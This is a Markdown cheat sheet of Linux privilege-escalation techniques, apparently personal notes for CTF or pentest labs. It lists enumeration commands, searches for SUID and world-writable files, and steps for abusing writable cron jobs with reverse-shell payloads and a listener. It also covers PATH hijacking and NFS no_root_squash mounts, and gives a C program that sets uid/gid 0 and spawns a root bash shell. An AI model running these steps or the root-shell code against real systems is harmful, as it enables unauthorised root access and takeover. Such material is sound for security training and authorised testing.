
# Commands

## general info
1. hostname
2. uname -a ---> can be used for kernel exploits
3.  /proc/version ---> can be used for kernel exploit
4.  /etc/issue ---> can be used for kernel exploits
5.  ps => ps -A, ps axjf, ps aux
6.  env
7.  sudo -l
8.  cat /etc/passwd | cut -d ":" -f 1 ---> view users. can also use | grep home istead
9.  history

## network info
1. ifconfig
2. ip route
3. netstat -a ---> netstat -at or -au for tcp or udp port. -l for listening port and -s for stats.

## find command
**Find files:**

-   `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
-   `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
-   `find / -type d -name config`: find the directory named config under “/”
-   `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
-   `find / -perm a=x`: find executable files
-   `find /home -user frank`: find all files for user “frank” under “/home”
-   `find / -mtime 10`: find files that were modified in the last 10 days
-   `find / -atime 10`: find files that were accessed in the last 10 day
-   `find / -cmin -60`: find files changed within the last hour (60 minutes)
-   `find / -amin -60`: find files accesses within the last hour (60 minutes)
-   `find / -size 50M`: find files with a 50 MB size
-   `find / -writable -type d 2>/dev/null` : Find world-writeable folders
-   `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
-   `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders
-   `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

## SUID/SGID
`find / -type f -perm -04000 -ls 2>/dev/null`  ---> check on gtfobins

## Capabilities
getcap -r 2>/dev/null ---> check on gtfobins

## cron jobs
- they are located at /etc/crontab
- check if current user has permissions on one of them 
- make suitable payload from [this site](https://www.revshells.com/) and  setup a listener accordingly.
- make sure chmod 777 is necessary.
- wait

## Path
- echo $PATH
- export PATH=/tmp:$PATH (add /tmp to path)
- check if current user has write permission in path.
- if a binary with suid or sgid tries to access the a malicious binary in the path, pwn!
- `find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`

## NFS
- NSF config file are found in /etc/exports ---> check for no_root_squash
- showmount -e \<victim ip> ---> shares
- mkdir \<dir in attacker box>
- sudo mount -o rw \<victim ip>:/share \<directory on attacker box> 
- put payload in the attacker directory => chmod +s \<payload>

# C code for privesc
```
int main()
{ setgid(0);
setuid(0);
system("/bin/bash");
return 0
}
```
	
# Automated tools
-   **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
-   **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
-   **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
-   **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
-   **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)